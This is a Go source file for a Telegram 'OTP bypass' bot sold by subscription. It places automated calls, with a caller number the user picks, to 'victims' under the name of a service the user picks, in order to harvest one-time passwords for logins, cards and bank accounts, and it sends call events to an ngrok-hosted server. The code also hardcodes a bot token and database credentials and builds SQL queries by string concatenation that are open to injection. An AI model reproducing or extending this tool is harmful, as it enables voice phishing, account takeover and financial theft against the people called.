package main

import (
	"database/sql"
	"fmt"
	"log"
	"strconv"
	"strings"
	"time"

	_ "github.com/go-sql-driver/mysql"
	"github.com/plivo/plivo-go"
	tb "gopkg.in/tucnak/telebot.v2"
)

type Plan struct {
	DPS        int
	tokens     int
	admin      int
	BlockUser  int
	TelegramID int64
	expiry     int64
}
type teleinfo struct {
	UserID string
}

type originalmsg struct {
	msgid int
}

var NGROK_URL string = "http://bbae-136-175-8-172.ngrok.io"

// replace with your url

func main() {

	client, _ := plivo.NewClient("1", "2", &plivo.ClientOptions{})

	//connecting to dB

	b, err := tb.NewBot(tb.Settings{
		// You can also set custom API URL.
		// If field is empty it equals to "https://api.telegram.org".
		URL: "https://api.telegram.org",

		Token:  "2112519490:AAFY1_RcSstktuVKJsxQoRTh4GOD-ae9Uw4",
		Poller: &tb.LongPoller{Timeout: 10 * time.Second},
	})
	if err != nil {
		log.Fatal(err)
		return
	}
	// Command: /start <PAYLOAD>

	b.Handle("/startcall", func(m *tb.Message) {

		data := strings.Split(m.Text, " ")
		/*
			data[1] - victim number
			data[2] - from number
			data[3] - victim name
			data[4] - service name
		*/
		fmt.Println(data)
		s := strconv.Itoa(m.Sender.ID)
		if registercheck(s) > 0 {
			mes, _ := b.Send(m.Sender, "<b>📱 Call Initiated"+"\n"+"Name: "+data[3]+"\n"+"Module: "+data[4]+"</b>", tb.ModeHTML)

			_, err := client.Calls.Create(
				plivo.CallCreateParams{
					From:             data[2], //from number
					To:               data[1], //to number
					AnswerURL:        fmt.Sprintf("%v/generate_xml/%v/%v/%v/%v", NGROK_URL, m.Chat.ID, data[3], data[4], mes.ID),
					AnswerMethod:     "GET",
					MachineDetection: "false",
					//MachineDetectionUrl: fmt.Sprintf("%v/machine/%v/%v", NGROK_URL, m.Chat.ID, mes.ID),
					HangupURL: fmt.Sprintf("%v/hangup/%v/%v", NGROK_URL, m.Chat.ID, mes.ID),
					RingURL:   fmt.Sprintf("%v/ring/%v/%v", NGROK_URL, m.Chat.ID, mes.ID)}, //name
			)
			if err != nil {
				panic(err)
			}
		} else {

			b.Send(m.Sender, "You are not allowed to use this bot , buy subscription first by using /buy command")
		}
	})
	b.Handle("/france", func(m *tb.Message) {

		data := strings.Split(m.Text, " ")
		/*
			data[1] - victim number
			data[2] - from number
			data[3] - victim name
			data[4] - service name
		*/
		fmt.Println(data)
		s := strconv.Itoa(m.Sender.ID)
		if registercheck(s) > 0 {
			mes, _ := b.Send(m.Sender, "<b>📱 Call Initiated"+"\n"+"Name: "+data[3]+"\n"+"Module: "+data[4]+"</b>", tb.ModeHTML)

			_, err := client.Calls.Create(
				plivo.CallCreateParams{
					From:             data[2], //from number
					To:               data[1], //to number
					AnswerURL:        fmt.Sprintf("%v/generate_fr_xml/%v/%v/%v/%v", NGROK_URL, m.Chat.ID, data[3], data[4], mes.ID),
					AnswerMethod:     "GET",
					MachineDetection: "false",
					//MachineDetectionUrl: fmt.Sprintf("%v/machine_fr/%v/%v", NGROK_URL, m.Chat.ID, mes.ID),
					HangupURL: fmt.Sprintf("%v/hangup_fr/%v/%v", NGROK_URL, m.Chat.ID, mes.ID),
					RingURL:   fmt.Sprintf("%v/ring_fr/%v/%v", NGROK_URL, m.Chat.ID, mes.ID)}, //name
			)
			if err != nil {
				panic(err)
			}
		} else {

			b.Send(m.Sender, "You are not allowed to use this bot , buy subscription first by using /buy command")
		}
	})

	b.Handle("/adduser", func(m *tb.Message) {

		data := strings.Split(m.Text, " ")
		/*
			data[1] - telegram id
			data[2] - admin y or n
		*/
		fmt.Println(data)
		s := strconv.Itoa(m.Sender.ID)
		if admincheck(s) > 0 {
			if adduser(data[1], data[2]) {
				b.Send(m.Sender, "User added to our database...")
			} else {
				b.Send(m.Sender, "Error while adding user...")
			}

		} else {

			b.Send(m.Sender, "Only admins can use this command :(")
		}
	})

	b.Handle("/adduser", func(m *tb.Message) {

		data := strings.Split(m.Text, " ")
		/*
			data[1] - telegram id
			data[2] - admin y or n
		*/
		fmt.Println(data)
		s := strconv.Itoa(m.Sender.ID)
		if admincheck(s) > 0 {
			if adduser(data[1], data[2]) {
				b.Send(m.Sender, "User added to our database...")
			} else {
				b.Send(m.Sender, "Error while adding user...")
			}

		} else {

			b.Send(m.Sender, "Only admins can use this command :(")
		}
	})
	b.Handle("/deluser", func(m *tb.Message) {

		data := strings.Split(m.Text, " ")
		/*
			data[1] - telegram id
		*/
		fmt.Println(data)
		s := strconv.Itoa(m.Sender.ID)
		if admincheck(s) > 0 {
			if deluser(data[1]) {
				b.Send(m.Sender, "User deleted from our database...")
			} else {
				b.Send(m.Sender, "Error while adding user...")
			}

		} else {

			b.Send(m.Sender, "Only admins can use this command :(")
		}
	})

	b.Handle("/start", func(m *tb.Message) {
		b.Send(m.Sender, "Hello to the OTP BYPASS BOT , that is powered by AnTiBoTs7 and MRX .  ")
		b.Send(m.Sender, "This bot will let you manage calls to Victims Phone numbers , where you will be able to grab their OTP Passwords for LOGINS , CREDIT CARDS , BANK ACCOUNTS etc.  ")
		b.Send(m.Sender, "If you have already bought a subscription , click /usage to know how to use the bot")
		b.Send(m.Sender, "If you are new here and wanna be a user of this telegram bot , you can buy a subscription by using the command /buy  ")

	})

	b.Handle("/buy", func(m *tb.Message) {
		b.Send(m.Sender, "we are charging 50 EUR for weekly subscription from here https://shoppy.gg/product/umIYTw0, 200 EUR for monthly subscription from here https://shoppy.gg/product/r6UniAt , or just contact @antibots7official")
	})

	b.Handle("/usage", func(m *tb.Message) {
		b.Send(m.Sender, "If you are already subscriber and want to make a call to victims to grab his OTP , just use this command :")
		b.Send(m.Sender, "/startcall victimnumber numberyouwant.to.call.victim.with victimname service.you.want.to.call.victim.with")
		b.Send(m.Sender, "Note don't use spaces in service and victim name")
	})

	fmt.Println(time.Now().Unix())
	b.Start() // starting the bot

}

func GetProfile(TelegramID string) (*Plan, error) {
	db, err := sql.Open("mysql", "root:shl@tcp(127.0.0.1:3306)/bypassbot")
	if err != nil {
		fmt.Println(err.Error())
	}
	row := db.QueryRow("SELECT DPS, TelagramID, Administrator, BlockedUser, SessionTokens, expiry FROM `users` WHERE TelagramID =" + TelegramID)
	if row.Err() != nil {
		return nil, row.Err()
	}
	var userCache Plan

	err = row.Scan(&userCache.DPS, &userCache.TelegramID, &userCache.admin, &userCache.BlockUser, &userCache.tokens, &userCache.expiry)
	if err != nil {
		return nil, err
	}

	return &userCache, nil

}

func registercheck(userid string) int {
	db, err := sql.Open("mysql", "root:shl@tcp(127.0.0.1:3306)/bypassbot")
	if err != nil {
		fmt.Println(err.Error())
	}
	defer db.Close()

	rows, err := db.Query("SELECT COUNT(*) FROM bypassbot.users WHERE ID =" + "'" + userid + "'")
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	var count int

	for rows.Next() {
		if err := rows.Scan(&count); err != nil {
			log.Fatal(err)
		}
	}

	return count
}

func admincheck(userid string) int {
	db, err := sql.Open("mysql", "root:shl@tcp(127.0.0.1:3306)/bypassbot")
	if err != nil {
		fmt.Println(err.Error())
	}
	defer db.Close()

	rows, err := db.Query("SELECT COUNT(*) FROM bypassbot.users WHERE ID =" + "'" + userid + "'" + "AND admin='y'")
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	var count int

	for rows.Next() {
		if err := rows.Scan(&count); err != nil {
			log.Fatal(err)
		}
	}

	return count
}

func adduser(userid string, admin string) bool {
	db, err := sql.Open("mysql", "root:shl@tcp(127.0.0.1:3306)/bypassbot")
	if err != nil {
		return false
	}
	defer db.Close()
	_, err = db.Query("INSERT INTO bypassbot.users (id , admin ) VALUES ('" + userid + "','" + admin + "');")
	if err != nil {
		return false
	}
	return true

}

func deluser(userid string) bool {
	db, err := sql.Open("mysql", "root:shl@tcp(127.0.0.1:3306)/bypassbot")
	if err != nil {
		return false
	}
	defer db.Close()
	_, err = db.Query("DELETE FROM bypassbot.users WHERE id= '" + userid + "';")
	if err != nil {
		return false
	}
	return true

}
